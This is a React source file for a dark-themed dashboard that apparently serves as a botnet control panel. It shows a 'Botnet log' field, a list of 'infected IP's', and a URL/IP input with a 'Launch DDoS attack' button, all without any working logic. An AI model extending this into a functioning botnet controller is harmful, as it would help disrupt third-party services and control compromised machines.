import React from 'react'
import Sidebar from './Sidebar'
import Topbar from './Topbar'
import * as mui from "@mui/material/"

class Block extends React.Component<{label: string, title: string}, {}>{
    render(){
    return(
        <mui.Box
            style={{
                marginBottom: "10px",
                userSelect: 'none'
            }}
            sx={{
            bgcolor: 'background.paper3',
            border: 1,
            borderColor: 'cyan',
            boxShadow: 1,
            borderRadius: 2,
            p: 2,
            minWidth: 300,
            }}
        >
        <mui.Box sx={{ color: 'text.secondary' }}>{this.props.label}</mui.Box>
            <mui.Box sx={{ color: 'text.primary', fontSize: 34, fontWeight: 'medium' }}>{this.props.title}</mui.Box>
        </mui.Box>
    )
    }
}

class Network extends React.Component{
	render(){
	return(
		<div>
		<mui.ThemeProvider theme={mui.createTheme({palette: {mode: "dark"}})}>
		<mui.Paper elevation={0}>
		
		<Topbar />
		<div style={{display: "flex"}}>
		<Sidebar />

		<div style={{marginLeft:"20px", marginTop:"20px"}}>
			<mui.Stack direction="column" spacing={5}>
				<mui.Box sx={{ width: '100%', maxWidth: 500 }}>
					<mui.Typography variant="h4" gutterBottom>
						BOTNET DATA :
					</mui.Typography>
					<mui.TextField id="botLog" style={{marginTop: "20px", width: "30vw"}}
						spellCheck="false"
						fullWidth
						label="Botnet log"
						multiline
						rows={10}
						defaultValue="*"
					/>
				</mui.Box>
				<br/>
				<div>
					<h2>List of infected IP's:</h2>
					<Block label="" title=""/>
				</div>
			</mui.Stack>
		</div>
		<div style={{display: "flex", marginLeft: "30vw", marginTop:"20px"}}>
			<mui.Stack direction="column" spacing={1}>
				<mui.Typography variant="h4" gutterBottom>
					ACTIONS :
				</mui.Typography>
				<br/>
				<h4 style={{marginBottom:"0px", marginLeft:"10px"}}>URL / IP</h4>
				<mui.TextField id="launch" label="" defaultValue=""/>
				<mui.Button style={{height: "40px"}} id="launch" variant="outlined" color="error">
					Launch DDoS attack
				</mui.Button>
			</mui.Stack>
		</div>

		</div>
		</mui.Paper>
		</mui.ThemeProvider>
		</div>
	)
	}
}

export default Network;